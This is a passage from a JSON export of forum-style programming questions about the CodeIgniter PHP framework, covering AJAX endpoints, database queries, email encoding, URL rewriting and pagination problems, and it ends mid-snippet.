[codeigniter]","body":"<p>I have one controller which I use for ajax calls, so in jQuery I have something  like:</p>\n\n<pre><code>$.ajax({ \n  type: 'POST',\n  url: '&lt;?php echo base_url().'ajax/post_message'; ?&gt;',\n  data: { message: msg }\n}).done(function(data) { \n    // handling callback here               \n});\n</code></pre>\n\n<p>here ajax/post_message is working ok, but it's also accessible from URL directly.</p>\n\n<p>How can I prevent this, should place ajax file somewhere else? If so, which url I can use to access it </p>\n"},{"tags":["image","codeigniter","path"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2358,"score":1,"question_id":6726874,"title":"codeigniter image path","body":"<p>I am a codeignite newbie and tried to add an image in my file under view folder. </p>\n\n<p>I add  <code>&lt;img src=\"../images/myImage.jpg\"&gt;&lt;/img&gt;</code> to my service_view.php. All I can see is a broken link of a small icon. </p>\n\n<p>however, if I change my path to </p>\n\n<pre><code>&lt;img src=\"../../user_guide/images/myImage.jpg\"&gt;&lt;/img&gt;\n</code></pre>\n\n<p>I can see the image. </p>\n\n<p>My file system is as follow:</p>\n\n<pre><code>application-\n   view -&gt;folder    (where service_view.php is located)\n   images -&gt; folder   (where myImage.jpg is located)\n\nuser_guide- \n   images -&gt;folder  ((where myImage.jpg is located))\n</code></pre>\n\n<p>Can anyone help me about this? Thanks a lot!</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13067586,"title":"query in codeIgniter style","body":"<p>I have below query:</p>\n\n<pre><code>SET @sql = NULL ;\nSELECT GROUP_CONCAT( DISTINCT CONCAT(  'select latitude,longitude,max(serverTime) as serverTime,', deviceID,  ' AS device from  d', deviceID,  '_gps' ) \nSEPARATOR  '  UNION ALL  ' ) \nINTO @sql \nFROM devices\nWHERE accountID =2;\nPREPARE stmt FROM @sql ;\nEXECUTE stmt;\n</code></pre>\n\n<p>Can someone help me to write the above query in codeIgniter style....</p>\n\n<p>ANd another thing is :What is the difference between writing the query in 1 and 2 formats</p>\n\n<pre><code>1. $query = $this-&gt;db-&gt;query('YOUR QUERY HERE'); \n\n\n\n 2. $this-&gt;db-&gt;select(\"...\");  \n    $this-&gt;db-&gt;from(); \n    $this-&gt;db-&gt;where();\n</code></pre>\n\n<p>Will it have any effect on performance if we use 2nd style... Thank You</p>\n"},{"tags":["codeigniter","curl","opengraph"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13070687,"title":"Asynchronous Post to Facebook Graph API using Codeiniter CURL not working","body":"<p>I'm receiving a valid access_token from an App and trying to do an asynchronous call to Facebook Graph API to do a Like action. I have a test below showing the problem. </p>\n\n<p>If I do a GET on \"facebook_actions/get_user_test/get_user_test/VALID_TOKEN\" it works, but if I use \"facebook_actions/test_curl\" I get an error \"An active access token must be used to query information about the current user.\"</p>\n\n<pre><code>function test_curl(){\n    $params = array(\n        \"access_token\"  =&gt; 'VALID_TOKEN',\n    );\n    $this-&gt;load-&gt;library('curl');  \n    echo $this-&gt;curl-&gt;simple_post('facebook_actions/get_user_test', $params);\n    echo $this-&gt;curl-&gt;debug();\n}\n\nfunction get_user_test($access_token = FALSE) {\n    if ($access_token === FALSE) {\n        $access_token = trim($this-&gt;input-&gt;post('access_token'));\n    }\n    try {\n        $user = $this-&gt;facebook-&gt;api('/me?access_token='.$access_token);\n        print_r($user);\n    } catch (Exception $e) {\n        print_r($e);\n    }   \n}\n</code></pre>\n"},{"tags":["codeigniter","odbc","openedge"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":290,"score":1,"question_id":7790934,"title":"odbc_exec error with progress","body":"<p>I am using Codeigniter Database Active Record (ODBC Driver). The application run well. But starting this day, there are error when trying to fetch data from Progress database (connected via odbc). The error message:</p>\n\n<blockquote>\n  <p>Severity: Warning  --> odbc_exec() [function.odbc-exec]: SQL error:\n  [DataDirect][ODBC Progress OpenEdge Wire Protocol driver]Unexpected\n  Network Error.  ErrNum = 10054, SQL state 08S01 in SQLExecDirect\n  D:\\xampp\\htdocs\\wavinet2-permana\\system\\database\\drivers\\odbc\\odbc_driver.php\n  153</p>\n</blockquote>\n\n<p>Error is in odbc_exec command. When I try to fetch data without using Codeigniter Active Record, it work. Data fetched. Trying to var_dump($this->db_odbc->conn_id) it return Resource. Network error ? I try to set up LinkedServer on my SQLServer and run the query generated by ActiveRecord, it work, data fetched successfully.</p>\n\n<p>I'm confuse, what is another posibilities that cause the error ?</p>\n"},{"tags":["php","mysql","forms","codeigniter","edit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13067578,"title":"codeigniter: I have rows in database (think like a blog post, title, postbody etc). What methods are there to present a form + save the submission?","body":"<p>Basically I am using codeigniter  and have LOTS of fields in each row for a database table.</p>\n\n<p>(for this example I'll pretend its a blog entry with just title/postbody but thats only to keep it simple)</p>\n\n<p>I know i could manually code in something like this:</p>\n\n<p>(psedudo code)</p>\n\n<pre><code>if (!$submitted) {\n   $data = get_existing_data_from_db();\n$showform=true;\n}\nif ($submitted) {\n\n   if (process_and_save_data_if_all_valid_data()) {\n\n       echo \"done\";\n\n   }\nelse {\n\n$data = get_data_from_submitted_data();\n$showform=true;\n\n}\n\n}\n\n\nif ($showform) {\n\necho \"&lt;form&gt;\";\necho \"&lt;input type='text' name='title' value='{$data-&gt;title}' /&gt;\";\n\n}\n</code></pre>\n\n<p>but is there any CI class or library that would let me do something more along the lines of this (again, pseudo code)</p>\n\n<pre><code>$fields_to_edit = array('title','postbody');\n$this-&gt;form_helper-&gt;edit_table_with_fields('posts', $fields_to_edit);\n</code></pre>\n\n<p>and the form_helper thing would automatically validate (obviously id set the rules) + show the form to the user, and save it (update mysql) if all correct</p>\n\n<p>does something like this exist for code igintor?</p>\n"},{"tags":["php","unit-testing","codeigniter","phpunit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13067989,"title":"Is there a way other than manually creating a CI mock when testing a library for CodeIgniter?","body":"<p>I am attempting to write a few unit tests for IonAuth, and as a first step I would like to test its public API.</p>\n\n<p>Since the library of course uses the CodeIgniter object quite extensively, I need a $ci object. How do I get this?</p>\n\n<ul>\n<li>Make a new repository altogether, with the entire CI directory included, and install Ion_auth in there and write tests out there.</li>\n<li>Or just mock the CI object, and supply it to the tested functions.</li>\n</ul>\n\n<p>If I am going with the latter option, I need a mock. I have noticed in the phpunit docs that I can use the <code>getMock()</code> function when the class is available and get an automated mock. But since CI is not directly available in the IonAuth library repo, what are my options? Do I need to manually define a Mock CI object (and the other CI library objects as necessary) and establish a fake API?</p>\n"},{"tags":["codeigniter","post","joomla"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12512277,"title":"Sending post data from Joomla to CodeIgniter","body":"<p>I have a system implemented in CodeIgniter, I am trying to send some data in a text area of Rsform component via POST to the url referring to my CodeIgniter system, I have tried usign AJAX request to send the post data using the following code </p>\n\n<pre><code>&lt;script&gt;\nalert(\"jsc\");\n  var data;\n  data='test from joomla!';\n      $.ajax({\n                type: \"POST\",\n                url : 'http://localhost/cii/index.php/login/getNews/',\n                data: {news:data},\n                cache: false,\n\n                success: function(html){\n                alert(html);\n                }\n            });\n</code></pre>\n\n<p></p>\n\n<p>getNews controller:</p>\n\n<pre><code>function getNews() {\n  //print_r($this-&gt;session-&gt;userdata);\n  header('Access-Control-Allow-Origin: *');\n  echo \"news is \".$news=$_POST['news'];\n  $data = array ( 'username' =&gt; \"null\", 'is_logged_in' =&gt; false, 'news'=&gt;$news);\n  $this-&gt;session-&gt;set_userdata($data); //var_dump($_POST); //               \n  print_r($this-&gt;session-&gt;userdata); session_start(); echo session_id(); \n} \n</code></pre>\n\n<p>but it failed, is there any other options ? </p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13065474,"title":"query in codeIgniter style","body":"<p>I have below query:</p>\n\n<pre><code>SET @sql = NULL ;\nSELECT GROUP_CONCAT( DISTINCT CONCAT(  'select latitude,longitude,max(serverTime) as serverTime,', deviceID,  ' AS device from  d', deviceID,  '_gps' ) \nSEPARATOR  '  UNION ALL  ' ) \nINTO @sql \nFROM devices\nWHERE accountID =2;\nPREPARE stmt FROM @sql ;\nEXECUTE stmt;\n</code></pre>\n\n<p>Can someone help me to write the above query in codeIgniter style....</p>\n\n<p>ANd another thing is :What is the difference between writing the query in 1 and 2 formats</p>\n\n<pre><code>1. $query = $this-&gt;db-&gt;query('YOUR QUERY HERE'); \n\n\n\n 2. $this-&gt;db-&gt;select(\"...\");  \n    $this-&gt;db-&gt;from(); \n    $this-&gt;db-&gt;where();\n</code></pre>\n\n<p>Will it have any effect on performance if we use 2nd style... Thank You</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13066780,"title":"Jquery - $.(post) data response not consistent with PHP","body":"<p>Jquery code:</p>\n\n<pre><code>var code = $('#code'),\n     id = $('input[name=id]').val(),\n     url = '&lt;?php echo base_url() ?&gt;mali_oglasi/mgl_check_paid';\n     code.on('focusout', function(){\n        var code_value = $(this).val();\n        if(code_value.length != 16 ) {\n            if ($('p[role=code_msg]').length != 0 ) $('p[role=code_msg]').remove() ;\n            code.after('&lt;p role=code_msg&gt;Pogrešan kod je unešen.&lt;/p&gt;');\n        } else {\n            if ($('p[role=code_msg]').length != 0 ) $('p[role=code_msg]').remove() ;\n            $.post(url, {id : id, code : code_value}, function(data){\n                if(data != 'TRUE'){\n                    code.after('&lt;p role=code_msg&gt;Uneti kod je neispravan.&lt;/p&gt;');\n                } else {\n                    code.after('&lt;p role=code_msg&gt;Status malog oglasa je promenjen.&lt;/p&gt;');\n                    code.after(create_image());\n                    code.remove();\n                }\n        });\n        }\n     });\n</code></pre>\n\n<p>PHP (Codeigniter) code:</p>\n\n<pre><code>function mgl_check_paid()\n    {\n        $code = $this-&gt;input-&gt;post('code');\n        $id = $this-&gt;input-&gt;post('id');\n        echo ($this-&gt;mgl-&gt;mgl_check_paid($code, $id)) ? 'TRUE' : 'FALSE';\n    }\n</code></pre>\n\n<p>Problem is following: \nWhen code is sent and if it is correct, PHP part will echo <strong>TRUE</strong>, and JS will execute <strong>ELSE</strong> part (after post), but for some reason it is not doing that (it is executing the first part of the statment)? What is wrong with this code? </p>\n"},{"tags":["php","apache","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":12145412,"title":"Mirrored Code Igniter section of website is motionless offline","body":"<p>I really hope someone can help me here - this is my first piece of work in this area and I have hit upon an issue I cannot fix and I starting to pull my hair out looking for an answer. </p>\n\n<h3>Overview</h3>\n\n<p>The plan was to mirror an existing functionional website offline for testing new site designs.</p>\n\n<p>Online the site appears to be hosted on a standard shared host. There is an FTP login and a control panel which gives access to the typical hosting, database and mailbox setup. </p>\n\n<p>Offline I am running RHEL 6.2 (Scientific Linux) with freshly installed Apache, mysql and PHP. I have the site content running as a virtual host on a dummy local domain and have copied the contents of the mysql database locally. </p>\n\n<p>Versions - Apache 2.2.15 (Scientific Linux) PHP 5.3.3 Mysql 5.1.61</p>\n\n<p>At a basic level my offline mirror works. Apache is serving up the HTML/CSS and images. The PHP files for the main content are pulling information out of the database and displaying it in the browser visible website. </p>\n\n<h3>The problem...</h3>\n\n<p>...is that the back-end administration section of the website appears to be in suspended animation - at the login panel stage it just sits there, unresponsive, when credentials are entered. </p>\n\n<p>I had been hoping that I could just change the MD5 encrypted password stored in the database and then get the admin section up and running offline. </p>\n\n<p>There is also a very slight visual difference between the online and offline versions of the login page. </p>\n\n<p>Online [<a href=\"http://imgur.com/J0yLh\" rel=\"nofollow\">http://imgur.com/J0yLh</a>]\nOffline [<a href=\"http://imgur.com/sDb6l\" rel=\"nofollow\">http://imgur.com/sDb6l</a>]</p>\n\n<p>This admin section has been coded in PHP using CodeIgniter as the framework. </p>\n\n<h3>Here are my notes so far from attempting to fix this....</h3>\n\n<p><strong>Mod_rewrite seems to be required by CodeIgniter.</strong></p>\n\n<p>I have confirmed this module is loaded by my local Apache (the module is listed to load in httpd.conf) and I have tested that it is working.</p>\n\n<p>The strange thing is that the method used to test relies on settings in a .htaccess file, while on the live site the .htaccess file is an empty file and I cannot find any other file on the FTP or switch via the admin panel that sets up mod_rewrite. </p>\n\n<p>If mod_rewrite is required for CodeIgniter then it is a mystery how it is setup on the online server. (It is worth me saying that it is /possible/ that there is a httpd.conf config for this on the server itself as the hosting company and original web design firm have very similiar names so may be one and the same.) </p>\n\n<p><strong>$config['url_protocol'] = \"AUTO\";</strong></p>\n\n<p>I have tried this in each of the settings and none seem to make it work.</p>\n\n<p><strong>Code Igniter error logs...</strong> </p>\n\n<p>These are the result of switching '$config['log_threshold'] = 4' within config.php (../admin/system/application/config).</p>\n\n<pre><code>ERROR - 2012-08-27 15:41:41 --&gt; Severity: 8192  --&gt; Function set_magic_quotes_runtime() is deprecated /var/www/html/website/httpdocs/admin/system/codeigniter/CodeIgniter.php 46\nDEBUG - 2012-08-27 15:41:41 --&gt; Config Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Hooks Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Router Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Output Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Input Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Global POST and COOKIE data sanitized\nDEBUG - 2012-08-27 15:41:41 --&gt; URI Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Language Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Loader Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Helpers loaded: url, form, array, auth\nERROR - 2012-08-27 15:41:41 --&gt; Severity: 8192  --&gt; Assigning the return value of new by reference is deprecated /var/www/html/website/httpdocs/admin/system/database/DB.php 81\nDEBUG - 2012-08-27 15:41:41 --&gt; Database Driver Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Session Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Controller Class Initialized\nDEBUG - 2012-08-27 15:41:41 --&gt; Helpers loaded: url\nDEBUG - 2012-08-27 15:41:41 --&gt; Helpers loaded: form\nDEBUG - 2012-08-27 15:41:41 --&gt; Config file loaded: config/bookings_settings.php\nERROR - 2012-08-27 15:41:41 --&gt; Severity: 8192  --&gt; Function ereg() is deprecated /var/www/html/website/httpdocs/admin/system/libraries/Config.php 177\nERROR - 2012-08-27 15:41:41 --&gt; Severity: 8192  --&gt; Function ereg() is deprecated /var/www/html/website/httpdocs/admin/system/libraries/Config.php 177\nERROR - 2012-08-27 15:41:41 --&gt; Severity: 8192  --&gt; Function ereg() is deprecated /var/www/html/website/httpdocs/admin/system/libraries/Config.php 177 \nDEBUG - 2012-08-27 15:41:41 --&gt; File loaded: /var/www/html/website/httpdocs/admin/system/application/views/login_view.php\nDEBUG - 2012-08-27 15:41:41 --&gt; Final output sent to browser\nDEBUG - 2012-08-27 15:41:41 --&gt; Total execution time: 0.0278\n</code></pre>\n\n<p>There were also repeated warnings regarding an incorrect timezone declaration which PHP states it corrects. I have stripped these out to make the log readable. </p>\n\n<p>The 'deprecated' error messages suggest that my version of PHP is more recent than the version online - but I am assuming that these are just warnings and the functions should still work with the version I am using.</p>\n\n<p>At this stage I am stumped - if you have any idea on what the problem could be, or how I could better approach the troubleshooting please could you take a moment to give me a hand? </p>\n"},{"tags":["php","list","codeigniter","checkbox"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":135,"score":0,"question_id":3042470,"title":"PHP/Codeigniter processing a list with javascript","body":"<p>I have a list of items that the user can select. I want it to be more user friendly than standard checkboxes so I have seperate div's each with a unique id.</p>\n\n<p>When user clicks an item, I use javascript to display a tick on top of that item and change the style to show that it is highlighted.</p>\n\n<p>Im trying to work out how I can pass the list of id's when the form is submitted. Remember, if the user unticks an item, it should be removed from the list, I was thinking of using comma seperated values in a hidden text field but couldnt work out how to remove items from the start of the list if they were deselected</p>\n"},{"tags":["php","codeigniter","http-status-code-500"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6203,"score":0,"question_id":6825075,"title":"CodeIgniter 500 Internal Server Error","body":"<p><strong>ANSWERED! IT WAS A TYPO OMG. Always check EVERY CHARACTER</strong></p>\n\n<p>I have three controllers, <code>Site</code>, <code>Login</code> and <code>Admin</code>. Site and Login work perfectly. I know I am logging in correctly, because I set the \"incorrect username\" blah blah error message, which shows up if I have incorrect login details. When I log in successfully however, I get a 500 Internal Server Error:</p>\n\n<p><code>HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfill the request.</code></p>\n\n<p>Here's the admin controller:</p>\n\n<pre><code>function __construct()\n    {\n        parent::Controller();\n        $this-&gt;isLogged();\n    }\n\n    function isLogged()\n    {\n        $isLogged = $this-&gt;session-&gt;userdata('isLogged');\n\n        if (!isset($isLogged) || $isLogged != true)\n        {\n            redirect('login/index');\n        }\n    }\n\n    function index()\n    {\n        $data['metaDescription'] = 'Admin area of danaemc.com';\n        $data['keywords'] = '';\n        $data['title'] = 'danaemc :: admin :: home';\n\n        $data['main_content'] = 'admin_view';\n        $this-&gt;load_view('includes/admin_template', $data);\n    }\n</code></pre>\n\n<p>In which where it tries to access <code>index()</code>, the 500 error happens.</p>\n\n<p>If you need more code, let me know in a comment. I hope it is something obvious.</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13066255,"title":"rewrite url in codeigniter","body":"<p>My codeigniter website current url is www.websitename.com/fronend/deals/index/all/all.\n(note:frontend is folder inside controller, and deals is controller)</p>\n\n<p>I wants to change it to www.websitename.com/deals/ using htaccess. I had tried some code but not able to do that.Is that possible to change it using htaccess.</p>\n\n<p>Previously, I had removed the index.php from the url of my codeigniter site using following htaccess code.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L,QSA]\n</code></pre>\n\n<p>this is working fine.So I think, I needs to add some rewrite rule for this.</p>\n\n<p>could u pls explain me how to do this.Thanks</p>\n"},{"tags":["php","mysql","codeigniter","queue"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13065975,"title":"PHP Queue System with Codeigniter. HOW?","body":"<p>I am creating a website for a client where they need the ability to generate 25,000 - 100,000 barcodes. I have licensed a software that generates the codes but it takes around 20 - 30 minutes to generate an order of say. 60,000 barcodes.</p>\n\n<p>So my question is this...</p>\n\n<p>Would it be possible to use the set time limit function in php set to zero (no time limit) and then pass the variables to the library with Ajax and use the ignore_user_abort function. This way essentially this is what would happen:</p>\n\n<p>Customer chooses barcode qty and type, they check out and after the payment gateway sends back a response of SUCCESSFUL, then we run an ajax request that sets the time limit to UNLIMITED and then tells the script to run even if the user closes their browser or exits the page. This way the server processes the order and it doesn't matter if it takes 2 seconds or 45 minutes. When the order is done the client can refresh their account and they would see their order.</p>\n\n<p>Am I just dreaming to think that this sounds like a good idea or would it be a viable solution? I don't have any experience in my years of coding with php queue systems, so I don't want to have to create one unless I absolutely have to.</p>\n"},{"tags":["codeigniter","form-validation","ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13065561,"title":"ip address array validation in codeigniter","body":"<p>I want to know how to do ip address array validation in codeigniter. I have an array containing of certain ip addresses.</p>\n\n<pre><code>     Consider texbox which is generated dynamically with name=ip[] and id auto increments like ip1 ip2......\n\n\n if for eg: $ip=$this-&gt;input-&gt;post('ip'); \n $ip[0] =1.1.1.1, $ip[1]=2.2.2.2, $ip[2]=3.3.3.3\n</code></pre>\n\n<p>how can i validate the ip addresses. I tried using the following:</p>\n\n<pre><code> for ($i = $ip[0]; $i &lt;= end($ip); $i++) {\n                    if (!$this-&gt;input-&gt;valid_ip($i)) {\n                        echo \" Not a valid IP address\";}}\n</code></pre>\n\n<p>It works fine when using close ip ranges like 2.2.2.2, 2.2.2.3, 2.2.2.4 etc: or a single ip address. but when the input is say 2.2.2.2, 3.3.3.3, 4.4.4.4 it lags. similarily it also lags when 2 ips are valid but if the third is a 'text' it lags.</p>\n"},{"tags":["php","codeigniter","character-encoding","html-email","iso-8859-1"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":11323044,"title":"Message string messed up when sending email with Codeigniter email class","body":"<p>So I encountered a problem while making a script to send email using Codeigniter's Email class. I set the configuration like this:</p>\n\n<pre><code>    $config['protocol'] = 'mail';\n    $config['charset'] = 'iso-8859-1';\n    $config['wordwrap'] = FALSE;\n    $config['mailtype']= \"html\";\n</code></pre>\n\n<p>The email is successfully sent, but when I open the email (the email client is a webmail client using iso-8859-1 charset) I got some of my words messed up.</p>\n\n<p>Here's the email I want it to be:</p>\n\n<pre><code>Thank you for registering a UMall account. Here's the details of your account:\nEmail: su-mie@ntu.edu.sg\nPass: 1234567\nFullname: Reinardus Surya Pradhitya\nPhone: 83612737\nClick here to activate your account: http://su.ntu.edu.sg/umall/index.php/register/activate/3a228e96124a66f1070361e0961854d5\n</code></pre>\n\n<p>And here's how it appears:</p>\n\n<pre><code>Thank you for registering a UMall account. Here's the details of your accou= nt:\nEmail: su-mie@ntu.edu.sg\nPass: 1234567\nFull= name: Reinardus Surya Pradhitya\nPhone: 83612737\nClick here= to activate your account: http://su.ntu.edu.sg/um= all/index.php/register/activate/3a228e96124a66f1070361e0961854d5\n</code></pre>\n\n<p>The faulty characters are always the \"= \". An equal sign followed by a whitespace. Does anyone know what's wrong?</p>\n\n<p>Interestingly, I tried opening it in another email client in my mobile phone, and it appears just nice.</p>\n\n<p>EDIT: I think the problem is in the word wrapping. I can't override the setting and I can't use {unwrap}{/unwrap}. How to solve this?</p>\n"},{"tags":["php","codeigniter","email","smtp","exchange"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13065695,"title":"CodeIgniter SMTP email message - characters replaced with equal signs","body":"<p>I'm using the CodeIgniter email library to send emails using our Exchange server. The problem I get is that the content of the email gets messed up.</p>\n\n<p>There are some words that get replaced with equal signs \"=\", I tried 2 different Exchange servers (they are in different locations and have no relation what so ever) and I still get the same issue. If I use any other server as an SMTP server to send emails everything works fine and the content stays intact and unchanged.</p>\n\n<p>Content before sending:</p>\n\n<pre><code>Dear Customer\n\nPlease find attached a comprehensive explanation of how to get our brochure of Angola. This has been sent to you at the request of Alex.\n\nThe information has been taken from www.example.co.uk  \"Company name\" is one of the leading tile and marble companies in the UK. \n</code></pre>\n\n<p>Content after sending it through the Microsoft Exchange:</p>\n\n<pre><code>Dear Customer\n\nPlease find attached a comprehensive explanation of how to get our brochure of A=gola. This has been sent to you at the request of Alex.\n\nThe information has been taken from www.example.co.uk  \"Company name\" is one of the leadi=g tile and marble companies in the UK. \n</code></pre>\n\n<p>As you can see for some reason some of the \"n\" characters were replaced with equal signs \"=\" (Example: Angola > A=gola)</p>\n\n<p>My email configuration:</p>\n\n<pre><code>$this-&gt;load-&gt;library('email');\n$config['charset']      = 'utf-8';\n$config['mailtype']     = 'html';\n\n\n// SMTP\n$config['protocol']     = 'smtp';\n$config['smtp_host']    = 'exchange.example.com'; //ssl://\n$config['smtp_user']    = 'email@example.com';\n$config['smtp_pass']    = 'password';\n$config['smtp_port']    = 25;\n\n$this-&gt;email-&gt;set_newline( \"\\r\\n\" );\n\n$this-&gt;email-&gt;initialize( $config );\n\n$this-&gt;email-&gt;clear();\n\n......\n\n$this-&gt;email-&gt;from( $frome, $fromn );\n$this-&gt;email-&gt;to( $email );\n\n$this-&gt;email-&gt;subject( $subject );\n$this-&gt;email-&gt;message( $send_message );\n\n\n$this-&gt;email-&gt;send();\n</code></pre>\n\n<p>Does anyone know why is the Microsoft exchange behaving this way? or is there some sort of setting I should use?</p>\n"},{"tags":["php","database","codeigniter","activerecord","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13064173,"title":"Codeigniter pagination is not appeared","body":"<p>i have view <code>vkategorimaterial</code> like this</p>\n\n<pre><code>&lt;table border=\"1\"&gt;\n                &lt;tr&gt;\n                    &lt;td colspan=\"4\"&gt;Tampilkan&lt;?php \n                    echo form_open('c_kategorimaterial/cari');\n                    echo nbs();$intext=array('name' =&gt; 'cari', 'class' =&gt; 'GUI');\n                    echo form_input($intext);\n                    echo nbs(); $inbutton=array('value' =&gt; 'Cari', 'class' =&gt; 'button');\n                    echo form_submit($inbutton);\n                    echo form_close();\n                    ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;\n                    &lt;td colspan=\"4\"&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;index.php/c_kategorimaterial/tambah\"&gt;&lt;img class =\"create\" src=\"&lt;?php echo base_url();?&gt;img/create.png\"&gt;&lt;/a&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;\n                    &lt;td&gt;Nomor&lt;/td&gt;\n                    &lt;td&gt;Kode Kategori Material / Jasa&lt;/td&gt;\n                    &lt;td&gt;Nama Material / Jasa&lt;/td&gt;\n                    &lt;td&gt;Perintah&lt;/td&gt;\n                &lt;/tr&gt;\n                 &lt;?php     if ( !empty($rows) ) \n                      {  \n                            $no = 1;   \n                            foreach ($rows as $row) { ?&gt;  \n                            &lt;tr id=\"row\"&gt;  \n                             &lt;td&gt;&lt;?php echo $no;?&gt;&lt;/td&gt;  \n                             &lt;td&gt;&lt;?php echo $row-&gt;Kode_Kategori_Material_Jasa;?&gt;&lt;/td&gt;  \n                             &lt;td&gt;&lt;?php echo $row-&gt;Nama_Material_Jasa;?&gt;&lt;/td&gt;  \n                             &lt;td&gt; &lt;a href=\"&lt;?php echo site_url('c_kategorimaterial/ubah/'.$row-&gt;Kode_Kategori_Material_Jasa.'/'.$row-&gt;Nama_Material_Jasa);?&gt;\"&gt;&lt;img class=\"perintah\" src=\"&lt;?php echo base_url(); ?&gt;img/update.png\"&gt;&lt;/a&gt;&lt;a href=\"&lt;?php echo site_url('c_kategorimaterial/hapus/'.$row-&gt;Kode_Kategori_Material_Jasa);?&gt;\" onclick=\"return confirm('akan dihapus, anda yakin ?');\"&gt;&lt;img class=\"perintah\" src=\"&lt;?php echo base_url(); ?&gt;img/delete.png\"&gt;&lt;/a&gt;&lt;/td&gt;                           \n\n                            &lt;/tr&gt;  \n                            &lt;?php  \n                             $no++;  \n                            }  \n                     } \n                     else { ?&gt;  \n            &lt;tr id=\"row\"&gt;  \n            &lt;td colspan=\"6\" align=\"center\"&gt;Tabel Kosong&lt;/td&gt;  \n            &lt;/tr&gt;\n\n        &lt;?php  \n        }  \n        ?&gt;  \n        &lt;/table&gt;\n       &lt;?php echo $this-&gt;pagination-&gt;create_links(); ?&gt;\n</code></pre>\n\n<p>then i made the controller named <code>c_kategorimaterial</code> here is the <code>index</code> part</p>\n\n<pre><code>function index()\n{\n    $query = $this-&gt;m_kategorimaterial-&gt;get();  \n    $config['base_url'] =  base_url().'index.php/c_kategorimaterial/index/';\n    $config['total_rows'] = $query-&gt;num_rows();\n    $config['per_page'] = 5; \n    $this-&gt;pagination-&gt;initialize($config);\n    $data['rows'] = $query-&gt;result();\n    $data['title'] = 'QB Kategori Material';\n    $this-&gt;load-&gt;view('menu',$data);\n    $this-&gt;load-&gt;view('v/vkategorimaterial');\n\n}\n</code></pre>\n\n<p>i want to make a pagination that showing 5 rows per page. and here is the model of <code>m_kategorimaterial-&gt;get</code></p>\n\n<pre><code> $this-&gt;db-&gt;order_by('Kode_Kategori_Material_Jasa','DESC');\n    $query = $this-&gt;db-&gt;get('ms_kategori_material',5);\n    return $query;\n</code></pre>\n\n<p>why does the pagination is not showing ? here is the result of <code>print_r($data['rows']);</code></p>\n\n<pre><code>Array ( [0] =&gt; stdClass Object ( [Kode_Kategori_Material_Jasa] =&gt; KKMJ006 [Nama_Material_Jasa] =&gt; Biji ) [1] =&gt; stdClass Object ( [Kode_Kategori_Material_Jasa] =&gt; KKMJ004 [Nama_Material_Jasa] =&gt; Teneh ) [2] =&gt; stdClass Object ( [Kode_Kategori_Material_Jasa] =&gt; KKMJ001 [Nama_Material_Jasa] =&gt; Air ) ) \n</code></pre>\n"},{"tags":["php","codeigniter","email"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":41,"score":-1,"question_id":13062258,"title":"Codeigniter send mail does not work","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/723883/redirect-with-codeigniter\">Redirect with CodeIgniter</a>  </p>\n</blockquote>\n\n\n\n<p>I'm having some issues with sending the mail out, i would  <em>*</em></p>\n\n<ul>\n<li>ALSO</li>\n</ul>\n\n<p><em>*</em> like to redirect to the same page after sending. May i know what am i doing wrong? Thank you!</p>\n\n<p>Controller</p>\n\n<pre><code>  function sendresume(){\n\n\n    $this-&gt;email-&gt;smtp_host('xxxx.amazonaws.com');\n    $this-&gt;email-&gt;smtp_user('Axxxx');\n    $this-&gt;email-&gt;smtp_pass('Axxxxxxx');\n    